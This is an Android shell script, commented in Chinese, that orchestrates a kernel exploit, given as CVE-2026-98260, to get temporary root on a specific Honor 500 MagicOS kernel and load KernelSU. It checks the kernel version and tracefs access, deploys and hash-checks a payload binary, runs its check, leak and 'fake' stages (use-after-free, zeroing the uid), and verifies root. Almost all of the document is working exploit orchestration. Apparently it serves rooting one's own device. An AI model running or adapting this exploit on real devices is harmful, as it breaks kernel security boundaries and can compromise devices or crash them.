#!/system/bin/sh
# ============================================================
# 荣耀500 MEY-AN00 / MagicOS 11.0.0.110 — CVE-2026-98260 临时 root
# 内核: 6.6.118-android15-8-g554929766a0d-abogki544555896-4k
#
# 设备侧脚本，必须在 shell(uid=2000) 域执行（adb shell / Shizuku 终端）。
# ★ 置信度标注：payload 本身【已实测成功】（2026-11-02）；
#   本脚本的【编排路径未真机验证】——那次成功走的是 GhostLock APK 经
#   Shizuku UserService 投放同一枚 payload 的路径，不是本脚本。
# ★ 一 boot 一发；成功后进程驻留，不要 kill，清理只能重启。
# ============================================================

PAYLOAD_NAME=cve-2026-98260-uid0
RD=/data/local/tmp/ksu98260
BIN=$RD/$PAYLOAD_NAME
LOG=$RD/run.log
LOCK=$RD/fired.lock
WANT_RELEASE="6.6.118-android15-8-g554929766a0d-abogki544555896-4k"
WANT_MD5="3e68cb01fba10447b0a34361b1326fac"
KSU_PKG="me.weishu.kernelsu"

# 自适应定位：脚本所在目录。adb 投放时即 $RD；Shizuku 从 /sdcard 跑时会自动搬运
HERE=$(cd "$(dirname "$0")" 2>/dev/null && pwd) || HERE=$RD
mkdir -p "$RD" 2>/dev/null

say() { echo "$*"; echo "$*" >> "$LOG"; }
die() { echo ""; echo "[STOP] $*"; echo "[STOP] $*" >> "$LOG"; exit 1; }

# 追加写日志不截断：每次开跑先删旧日志
rm -f "$LOG"
echo "===== $(date '+%F %T') 98260 run =====" >> "$LOG"
say "[i] 脚本目录: $HERE"
say "[i] 编排路径未真机验证；payload 已实测（2026-11-02）"

# ---------- 0. 环境自检 ----------
say "[0/6] 环境自检"
UID_NOW=$(id -u 2>/dev/null)
say "      id -u = $UID_NOW   (期望 2000)"
[ "$UID_NOW" = "2000" ] || die "当前不是 shell(2000) 域（uid=$UID_NOW）。请用 adb shell 或 Shizuku 终端；App 域无效。"

REL=$(uname -r)
say "      uname -r = $REL"
[ "$REL" = "$WANT_RELEASE" ] || die "内核 release 不匹配（期望 $WANT_RELEASE）。换 OTA 内核必须重新标定 11 项常量，禁止直接套用。"

# 独立透镜：用 boot_id 做一 boot 一发门控，不用 uptime（读数窗口会误判）
BOOT=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || echo unknown)
if [ -f "$LOCK" ] && [ "$(cat "$LOCK" 2>/dev/null)" = "$BOOT" ]; then
    die "本 boot 已打过一发（一 boot 一发）。同 boot 再打会累积破坏内核数据结构，请重启后再试。"
fi

# ---------- 1. tracefs 门槛 ----------
say "[1/6] tracefs 可读性（98260 的硬门槛）"
TRACE=/sys/kernel/tracing/per_cpu/cpu0/trace_pipe_raw
TRACE_OK=0
if command -v timeout >/dev/null 2>&1; then
    timeout 2 cat "$TRACE" >/dev/null 2>&1 && TRACE_OK=1
else
    # Android toybox 未必带 timeout；trace_pipe_raw 无数据时应立即返回
    cat "$TRACE" >/dev/null 2>&1 </dev/null && TRACE_OK=1
fi
[ "$TRACE_OK" = "1" ] || die "trace_pipe_raw 不可读。98260 与 64560 双堵，需转 BPF / perf / io_uring 重新测绘。"
say "      OK: trace_pipe_raw 可读"

# ---------- 2. 当前 root 状态 / KSU Manager ----------
say "[2/6] 当前 root 状态"
if grep -qw kernelsu /proc/modules 2>/dev/null; then
    say "      KernelSU 已加载，无需再打。"
    say "      $(grep -w kernelsu /proc/modules)"
    exit 0
fi
if command -v pm >/dev/null 2>&1; then
    pm path "$KSU_PKG" >/dev/null 2>&1 || \
        die "未安装 KernelSU Manager ($KSU_PKG)。fake 成功后 ksud late-load 依赖它的 libksud.so，请先安装 APK。"
    say "      KernelSU Manager 已安装"
else
    say "      [warn] 无法确认 KernelSU Manager 是否安装（pm 不可用）"
fi

# ---------- 3. 部署 payload ----------
say "[3/6] 部署 payload"
if [ -f "$HERE/$PAYLOAD_NAME" ] && [ "$HERE/$PAYLOAD_NAME" != "$BIN" ]; then
    cp "$HERE/$PAYLOAD_NAME" "$BIN" || die "复制 payload 失败：$HERE/$PAYLOAD_NAME"
elif [ ! -f "$BIN" ]; then
    die "找不到 payload。请把 $PAYLOAD_NAME 放在脚本同目录，或先跑 PC 侧 onefire.sh 投放。"
fi
chmod 755 "$BIN" || die "chmod 失败（/sdcard 是 noexec，必须放到 /data/local/tmp）"
# ksud 兜底：若同目录带了 ksud 就一并部署；不带则依赖 Manager 自带的 libksud.so
[ -f "$HERE/ksud" ] && cp "$HERE/ksud" "$RD/ksud" 2>/dev/null && chmod 755 "$RD/ksud" 2>/dev/null
say "      $BIN $(ls -l "$BIN" | awk '{print $5}') bytes"
if command -v md5sum >/dev/null 2>&1; then
    GOT=$(md5sum "$BIN" | awk '{print $1}')
    say "      md5 = $GOT"
    [ "$GOT" = "$WANT_MD5" ] || die "payload md5 不符（期望 $WANT_MD5）。上机前必验二进制，禁止把错误版本推到设备。"
else
    say "      [warn] 本机无 md5sum，跳过哈希校验（不推荐）"
fi

# ---------- 4. 只读自检（零写入 / 只写自己进程页） ----------
say "[4/6] 只读自检"
"$BIN" check 2>&1 | tee -a "$LOG"
CHECK_RC=$?
[ "$CHECK_RC" = "0" ] || die "check 失败（rc=$CHECK_RC）。看 $LOG 里 tracefs 与 direct map base 两行，别往下打。"
"$BIN" leak 2>&1 | tee -a "$LOG"

# ---------- 5. 真打 ----------
say "[5/6] 执行 fake（UAF -> 零写 uid -> ksud late-load）"
say "      ⚠ 有概率在注入阶段重启；判断重启请读 boot_id，不要只看 uptime。"
echo "$BOOT" > "$LOCK" 2>/dev/null
"$BIN" fake 2>&1 | tee -a "$LOG"

# ---------- 6. 验证：独立透镜，不看 payload 自报 ----------
say "===== 验证 ====="
say "id         : $(id)"
say "getenforce : $(getenforce)"
say "modules    : $(grep -w kernelsu /proc/modules 2>/dev/null || echo 'kernelsu NOT loaded')"
say "su -c id   : $(su -c id 2>/dev/null || echo 'su unavailable')"
say ""
say "判定：id 为 uid=0(root) 且 /proc/modules 出现 kernelsu 且 su -c id 返回 uid=0 = 成功。"
say "KSU_LOADED / ROOT_SUCCESS 一类自报不作唯一依据。"
say "成功后的进程驻留是故意的，不要 kill；清理只能重启。"
say "日志：$LOG"
